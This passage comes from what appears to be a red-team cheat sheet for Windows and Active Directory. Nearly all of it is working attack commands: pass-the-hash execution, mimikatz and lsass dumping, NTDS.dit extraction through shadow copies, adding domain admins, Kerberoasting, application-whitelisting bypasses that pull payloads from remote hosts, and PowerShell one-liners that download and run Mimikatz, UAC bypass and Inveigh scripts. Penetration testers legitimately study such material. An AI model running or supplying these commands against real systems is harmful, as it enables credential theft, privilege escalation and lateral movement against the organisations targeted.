<p><code>crackmapexec smb 172.16.110.154 -u Administrator -p Password1 --lsa</code></p>
<h3 id="winexe-to-boxes-not-opsec-safe-service-is-run-no-cleanup">Winexe to boxes (not opsec safe) - service is run. No cleanup.</h3>
<p><code>pth-winexe //10.0.0.1 -U DOMAIN/zdefense/blahuser%blahpassword cmd</code></p>
<p><code>pth-winexe //10.0.0.1 -U DOMAIN/zdefense/blahuser%hash cmd</code></p>
<h3 id="impacket-psexecpy-to-boxes-not-opsec-safe-does-cleanup-after-but-leaves-logs-after-installing-and-running-service">Impacket psexec.py to boxes (not opsec safe) - does cleanup after but leaves logs after installing and running service.</h3>
<p><code>psexec.py user@IP</code></p>
<p><code>psexec.py user@IP -hashes ntlm:hash</code></p>
<h3 id="impacket-wmiexecpy-opsec-safe-unless-wmi-logging-is-enabled">Impacket wmiexec.py (opsec safe - unless WMI logging is enabled)</h3>
<p><code>wmiexec.py domain/user@IP</code></p>
<p><code>wmiexec.py domain/user@IP -hashes ntlm:hash</code></p>
<h3 id="impacket-smbclient-probably-opsec-safe-as-its-just-using-smb">Impacket smbclient (probably opsec safe as its just using SMB)</h3>
<p><code>python smbclient.py domain/blahuser@10.0.0.1 -hashes aad3b435b51404eeaad3b435b51404ee:blah</code></p>
<h2 id="rdp-pass-the-hash">RDP Pass the Hash</h2>
<p>Using mimikatz:</p>
<p><code>privilege::debug</code>
<code>sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"</code></p>
<p>If disabled:</p>
<p><code>sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:powershell.exe</code>
<code>Enter-PSSession -Computer &lt;Target&gt;</code>
<code>New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force</code></p>
<h2 id="invoke-the-hash">Invoke the hash</h2>
<p><code>Invoke-WMIExec -Target blah -Username blah -Hash NTLMHASH -Command blah</code></p>
<h2 id="password-dumping">Password dumping</h2>
<h3 id="from-live-kali-on-a-workstation">From Live Kali on a workstation</h3>
<p><code>samdump2 SYSTEM SAM &gt; hashes.txt</code></p>
<h3 id="local">Local</h3>
<p><code>C:\&gt; reg.exe save hklm\sam c:\temp\sam.save</code></p>
<p><code>C:\&gt; reg.exe save hklm\security c:\temp\security.save</code></p>
<p><code>C:\&gt; reg.exe save hklm\system c:\temp\system.save</code></p>
<p><code>secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></p>
<p><code>pwdump system sam</code></p>
<h3 id="in-memory">In Memory</h3>
<p><code>C:\&gt; procdump.exe -accepteula -ma lsass.exe c:\lsass.dmp 2&gt;&amp;1</code></p>
<p><code>C:\&gt; mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit</code></p>
<p><code>C:\&gt;mini.exe</code></p>
<p>https://github.com/b4rtik/ATPMiniDump</p>
<h3 id="from-box">From box</h3>
<p><code>mimikatz # privilege::debug</code>
<code>mimikatz # sekurlsa::logonPasswords full</code></p>
<h3 id="remote">Remote</h3>
<p><code>impacket-secretsdump Administrator@ip</code>
<code>impacket-secretsdump Administrator@ip -hashes ntlm:hash</code></p>
<h3 id="domain">Domain</h3>
<p>To find where NTDS is run the below:</p>
<p><code>reg.exe query hklm\system\currentcontrolset\services\ntds\parameters</code></p>
<h3 id="vssadmin">vssadmin</h3>
<p><code>C:\vssadmin list shadows</code></p>
<p><code>C:\vssadmin create shadow /for=C:</code></p>
<p><code>copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.dit .</code></p>
<p><code>copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM .</code></p>
<p><code>copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .</code></p>
<p><code>secretsdump.py -system system.save -ntds ntds.dit local -just-dc-ntlm</code></p>
<p>remove machine accounts</p>
<p><code>grep -a -F ':::' hashes.txt | grep -av '$:' &gt; finalhashes.txt</code></p>
<p>only passwords for pipal</p>
<p><code>cut -f 3 -d ':' cracked_with_users_enabled.txt</code></p>
<p><code>vssadmin delete shadows /shadow={cd534584-a272-44ab-81e1-ab3f5fbe9b29}</code></p>
<p>godumpsecrets for faster</p>
<h3 id="ntdsutil">ntdsutil</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>C:\&gt;ntdsutil
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>ntdsutil: activate instance ntds
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>ntdsutil: ifm
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>ifm: create full c:\pentest
</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>ifm: quit
</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>ntdsutil: quit
</span></code></pre></div>
<p><code>ntdsutil</code></p>
<p><code>ntdsutil: snapshot</code></p>
<p><code>ntdsutil: list all</code></p>
<p><code>ntdsutil: create</code></p>
<p><code>snapshot: mount 1</code></p>
<p>Cleanup snapshots:</p>
<p><code>snapshot: list all</code></p>
<p><code>snapshot: unmount 1</code></p>
<p><code>snapshot: list all</code></p>
<p><code>snapshot: delete 1</code></p>
<h2 id="post-compromise-not-opsec-safe">Post Compromise (Not opsec safe)</h2>
<p>Add user to local admin and domain admin</p>
<h3 id="add-domain-admin">Add Domain Admin</h3>
<p><code>net user username password /ADD /DOMAIN</code></p>
<p><code>net group "Domain Admins" username /ADD /DOMAIN</code></p>
<h3 id="add-local-admin">Add Local Admin</h3>
<p><code>net user username password /ADD</code></p>
<p><code>net localgroup Administrators username /ADD</code></p>
<h3 id="tasklist-scraper-to-find-logged-in-admins">Tasklist scraper to find logged in admins</h3>
<p>If powershell not enabled or unable to run BloodHound this script will find admins.</p>
<p><code>#!/bin/sh</code></p>
<p><code>for ip in $(cat ip.txt);do</code></p>
<p><code>pth-winexe -U Admin%hash //$ip "ipconfig"</code></p>
<p><code>pth-winexe -U Admin%hash //$ip "tasklist /v"</code></p>
<p><code>done</code></p>
<h3 id="kerberoasting">Kerberoasting</h3>
<p><code>Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat</code></p>
<p>https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1</p>
<p>Invoke-AutoKerberoast</p>
<p><code>python autoKirbi2hashcat.py ticketfilefromautoinvokekerberoast</code></p>
<p><code>IEX (New-Object Net.WebClient).DownloadString('https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast</code></p>
<h3 id="hashcat-alienware-kerbtgt-hash-cracking">Hashcat Alienware - kerbtgt hash cracking</h3>
<p><code>sudo apt-get install nvidia-367</code></p>
<p><code>sudo nvidia-smi</code></p>
<p><code>reboot</code></p>
<p><code>sudo hashcat -I</code></p>
<p><code>hashcat -m 13100 kerb.txt ~/Downloads/realuniq.lst</code> </p>
<h3 id="laps-getlapspasswords">LAPS - GetLAPSPasswords</h3>
<p>https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1</p>
<h2 id="priv-esc">Priv Esc</h2>
<h3 id="powerup">Powerup</h3>
<p><code>IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks</code></p>
<h2 id="file-transfer">File Transfer</h2>
<h3 id="smb-server-in-kali">SMB Server in Kali</h3>
<p><code>python smbserver.py test /root/tools</code></p>
<h3 id="python-web-server">Python Web Server</h3>
<p><code>python -m SimpleHTTPServer &lt;port&gt;</code></p>
<h2 id="domain-fronting">Domain Fronting</h2>
<p>https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/
https://signal.org/blog/doodles-stickers-censorship/
https://www.securityartwork.es/2017/01/24/camouflage-at-encryption-layer-domain-fronting/
https://trac.torproject.org/projects/tor/wiki/doc/meek
http://bryceboe.com/2012/03/12/bypassing-gogos-inflight-internet-authentication/</p>
<h2 id="awl-bypasses">AWL bypasses</h2>
<h3 id="powershell-without-powershellexe">Powershell without powershell.exe</h3>
<p><code>SharpPick.exe -d "http://zdefense/blah.ps1"</code></p>
<h3 id="squiblytwo">Squiblytwo</h3>
<p><code>wmic.exe os get /format:"http://zdefense/foo.xsl"</code></p>
<h3 id="sharpshooter">Sharpshooter</h3>
<p>https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/</p>
<p><code>python SharpShooter.py --stageless --dotnetver 2 --payload js --output foo --rawscfile ./output/payload.bin --smuggle --template mcafee --com xslremote --awlurl http://ZDefense/foo.xsl</code></p>
<h3 id="cypher-queries">cypher queries</h3>
<p>user to which box the user has localadmin</p>
<p><code>MATCH (u:User)-[r:MemberOf|:AdminTo*1..]-&gt;(c:Computer) return u.name, collect(c.name)</code></p>
<p>List of DAs
<code>Match p=(u:User)-[:MemberOf]-&gt;(g:Group) WHERE g.name= "DOMAIN ADMINS@ZDefense" return u.displayname</code></p>
<div class="language-text highlight"><pre><span></span><code>https://downloads.skullsecurity.org/dnscat2/
https://github.com/lukebaggett/dnscat2-powershell
$ dnscat –host &lt;dnscat server_ip&gt;
</code></pre></div>
<h1 id="collection-of-powershell-one-liners-for-red-teamers-and-penetration-testers-to-use-at-various-stages-of-testing">Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing.</h1>
<h1 id="invoke-bypassuac-and-start-powershell-prompt-as-administrator-or-replace-to-run-any-other-command">Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]</h1>
<p>powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"</p>
<h1 id="invoke-mimikatz-dump-credentials-from-memory">Invoke-Mimikatz: Dump credentials from memory</h1>
<p>powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"</p>
<h1 id="import-mimikatz-module-to-run-further-commands">Import Mimikatz Module to run further commands</h1>
<p>powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"</p>
<h1 id="invoke-massmimikatz-use-to-dump-creds-on-remote-host-replace-envcomputername-with-target-server-names">Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]</h1>
<p>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"</p>
<h1 id="powerup-privilege-escalation-checks">PowerUp: Privilege escalation checks</h1>
<p>powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”</p>
<h1 id="invoke-inveigh-and-log-output-to-file">Invoke-Inveigh and log output to file</h1>
<p>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y –NBNS Y –mDNS Y  –Proxy Y -LogOutput Y -FileOutput Y"</p>
<h1 id="invoke-kerberoast-and-provide-hashcat-compatible-hashes">Invoke-Kerberoast and provide Hashcat compatible hashes</h1>
<p>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"</p>
<h1 id="invoke-sharefinder-and-print-output-to-file">Invoke-ShareFinder and print output to file</h1>
<p>powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"</p>
<h1 id="import-powerview-module-to-run-further-commands">Import PowerView Module to run further commands</h1>
<p>powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"</p>
<h1 id="invoke-bloodhound">Invoke-Bloodhound</h1>
<p>powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"</p>
<h1 id="find-gpp-passwords-in-sysvol">Find GPP Passwords in SYSVOL</h1>
<p>findstr /S cpassword $env:logonserver\sysvol*.xml
findstr /S cpassword %logonserver%\sysvol*.xml (cmd.exe)</p>
<h1 id="run-powershell-prompt-as-a-different-user-without-loading-profile-to-the-machine-replace-domain-and-user">Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]</h1>
<p>runas /user:DOMAIN\USER /noprofile powershell.exe</p>
<h1 id="insert-reg-key-to-enable-wdigest-on-newer-versions-of-windows">Insert reg key to enable Wdigest on newer versions of Windows</h1>
<p>reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1</p>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/redteamopsec.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
</footer>

</body>
</html>